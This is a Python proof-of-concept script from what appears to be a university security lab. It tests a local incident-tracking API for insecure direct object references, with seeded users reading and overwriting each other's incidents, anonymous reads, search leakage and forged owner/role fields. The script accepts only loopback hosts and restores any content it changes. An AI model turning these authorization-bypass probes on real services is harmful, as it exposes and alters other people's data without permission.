"""Local LR04 read PoC. Credentials and separate cookie jars stay in memory."""

import argparse
import http.cookiejar
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


ALICE = "20000000-0000-0000-0000-000000000001"
BOB = "20000000-0000-0000-0000-000000000002"
MISSING = "20000000-0000-0000-0000-ffffffffffff"
SUBJECTS = {
    "alice": "10000000-0000-0000-0000-000000000001",
    "bob": "10000000-0000-0000-0000-000000000002",
    "morgan": "10000000-0000-0000-0000-000000000003",
}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Client:
    def __init__(self, host):
        self.host = host
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({}),
            urllib.request.HTTPCookieProcessor(self.jar),
            NoRedirect(),
        )

    def request(self, path, data=None, method=None):
        headers = {"Accept": "application/json"}
        if data is not None:
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(
            self.host + path,
            data=None if data is None else json.dumps(data).encode("utf-8"),
            headers=headers,
            method=method,
        )
        try:
            response = self.opener.open(request, timeout=15)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            raw = response.read()
            body = json.loads(raw) if raw else None
            return response.status, response.headers.get_content_type(), body


def require(condition, message):
    if not condition:
        # Never include a raw request, exception, headers or credentials here.
        raise AssertionError(message)


def emit(label, result):
    status, content_type, body = result
    safe = {"scenario": label, "status": status, "contentType": content_type}
    if isinstance(body, dict):
        safe["body"] = {key: body[key] for key in
                        ("id", "title", "ownerDisplayName", "status", "traceId")
                        if key in body}
    print(json.dumps(safe, ensure_ascii=False))


def details(client, incident_id, expected, label):
    result = client.request("/api/incidents/" + incident_id)
    emit(label, result)
    require(result[0] == expected, label + ": unexpected status")
    require(result[1] == ("application/json" if expected == 200 else
                          "application/problem+json"), label + ": unexpected content type")
    if expected == 200:
        require(result[2]["id"] == incident_id, label + ": wrong resource")
    return result


def run(args, password):
    vulnerable = args.expect == "vulnerable"
    print("expect=" + args.expect)
    clients = {}
    for user, subject_id in SUBJECTS.items():
        client = Client(args.host)
        login = client.request("/api/auth/login", {"userName": user, "password": password})
        print(f"{user}_login_status={login[0]}")
        require(login[0] == 204, user + ": login failed (credentials omitted)")
        me = client.request("/api/me")
        require(me[0] == 200 and me[2]["id"] == subject_id, user + ": wrong principal")
        print(f"{user}_verified_subject={subject_id}")
        clients[user] = client

    alice, bob, morgan = (clients[user] for user in SUBJECTS)
    # Exact same opener, cookie, method and headers; only the URL identifier differs.
    cookie_before = tuple((cookie.name, cookie.value) for cookie in alice.jar)
    details(alice, ALICE, 200, "A-02 Alice -> Alice")
    foreign = details(alice, BOB, 200 if vulnerable else 404, "A-03 Alice -> Bob")
    cookie_after = tuple((cookie.name, cookie.value) for cookie in alice.jar)
    require(bool(cookie_before) and cookie_before == cookie_after, "Alice session changed")
    print("alice_same_cookie_for_own_and_foreign=true")
    require(alice.request("/api/me")[2]["id"] == SUBJECTS["alice"], "Alice principal changed")
    unknown = details(alice, MISSING, 404, "A-10 Alice -> missing")
    if not vulnerable:
        normalized = lambda body: {k: v for k, v in body.items() if k not in ("traceId", "requestId")}
        require(normalized(foreign[2]) == normalized(unknown[2]), "Foreign/missing bodies differ")
    details(bob, BOB, 200, "Bob -> Bob")
    details(bob, ALICE, 200 if vulnerable else 404, "Bob -> Alice")
    details(morgan, ALICE, 200, "A-03R Morgan -> Alice")
    details(morgan, BOB, 200, "Morgan -> Bob")

    anonymous = Client(args.host)
    require(anonymous.request("/api/me")[0] == 401, "Anonymous unexpectedly authenticated")
    require(len(anonymous.jar) == 0, "Anonymous client has a cookie")
    details(anonymous, BOB, 200 if vulnerable else 401, "A-01 Anonymous -> Bob")

    if args.perimeter:
        # Optional observations for the existing list/search/summary, not mutations.
        for path, label in [
            ("/api/incidents", "A-05 Alice list"),
            ("/api/incidents/search?" + urllib.parse.urlencode({"q": "Невідома спроба входу"}),
             "A-11 Alice search Bob title"),
        ]:
            status, _, body = alice.request(path)
            require(status == 200 and isinstance(body, list), label + ": unexpected result")
            contains_bob = any(row["id"] == BOB for row in body)
            print(json.dumps({"scenario": label, "status": status,
                              "containsBob": contains_bob, "count": len(body)}))
            require(contains_bob == vulnerable, label + ": unexpected visibility")
        status, _, summary = alice.request("/api/incidents/severity-summary")
        require(status == 200 and isinstance(summary, list), "Summary failed")
        print(json.dumps({"scenario": "A-11 Alice summary", "status": status,
                          "counts": [{"severity": row["severity"], "count": row["count"]}
                                     for row in summary]}))
        # The total is reported, not treated as proof of correct owner scoping.

    if args.mutation:
        path = "/api/incidents/" + BOB
        before = details(bob, BOB, 200, "Mutation: Bob reads before")[2]
        payload = {"title": "LR04 controlled update by Alice",
                   "description": "Контрольована навчальна зміна чужого інциденту для PoC ЛР 4."}
        changed = False
        try:
            result = alice.request(path, payload, method="PUT")
            changed = result[0] == 204
            emit("A-04 Alice updates Bob", result)
            require(result[0] == (204 if vulnerable else 404), "Unexpected foreign update status")
            after = details(bob, BOB, 200, "Mutation: Bob reads after")[2]
            require(after["title"] == (payload["title"] if vulnerable else before["title"]),
                    "Unexpected title after mutation")
            require(after["description"] == (payload["description"] if vulnerable else before["description"]),
                    "Unexpected description after mutation")
            for key in ("id", "severity", "status", "ownerDisplayName", "occurredAtUtc", "createdAtUtc", "comments"):
                require(after[key] == before[key], "Mutation changed protected field: " + key)
            print("foreign_content_changed=" + str(vulnerable).lower())
            print("protected_response_fields_unchanged=true")
            require(anonymous.request(path, payload, method="PUT")[0] == 401,
                    "Anonymous update must require login")
            print("anonymous_update_status=401")
            forged = dict(payload, ownerUserId=SUBJECTS["alice"], status="Closed", role="Administrator")
            require(alice.request(path, forged, method="PUT")[0] == 400,
                    "Protected request fields must be rejected")
            require(details(bob, BOB, 200, "Mutation: Bob reads after forged request")[2] == after,
                    "Rejected request changed resource")
            print("forged_fields_status=400; rejected_request_state_unchanged=true")
        finally:
            if changed:
                restored = bob.request(path, {"title": before["title"],
                                             "description": before["description"]}, method="PUT")
                require(restored[0] == 204, "Owner failed to restore original content")
                require(details(bob, BOB, 200, "Mutation: Bob restores content")[2] == before,
                        "Original response content was not restored")
                print("original_content_restored=true")

    print("poc_checks=passed")
    if vulnerable:
        print("security_contract=NOT_SATISFIED (IDOR and anonymous disclosure reproduced)")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="http://localhost:5080")
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--perimeter", action="store_true")
    parser.add_argument("--mutation", action="store_true", help="Run and restore the synthetic Bob content mutation")
    parser.add_argument("--check", action="store_true", help="Check environment only; no HTTP requests")
    args = parser.parse_args()
    url = urllib.parse.urlsplit(args.host)
    require(url.scheme in ("http", "https") and url.hostname in ("localhost", "127.0.0.1", "::1")
            and not url.username and not url.password and url.path in ("", "/")
            and not url.query and not url.fragment, "Use a loopback host for the synthetic lab")
    args.host = args.host.rstrip("/")
    password = os.environ.get("SeedUsers__Password")
    require(bool(password), "Set SeedUsers__Password in the process environment outside Git")
    if args.check:
        print("seed_password_present=true")
        require(json.loads(json.dumps({"password": password}))["password"] == password,
                "JSON round-trip failed")
        print("login_json_roundtrip=true")
        return
    run(args, password)


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8")
    try:
        main()
    except AssertionError as error:
        print("check_failed=" + str(error), file=sys.stderr)
        sys.exit(1)
    except (OSError, ValueError, KeyError, TypeError):
        print("request_failed: check the local API and seed; sensitive details omitted", file=sys.stderr)
        sys.exit(1)
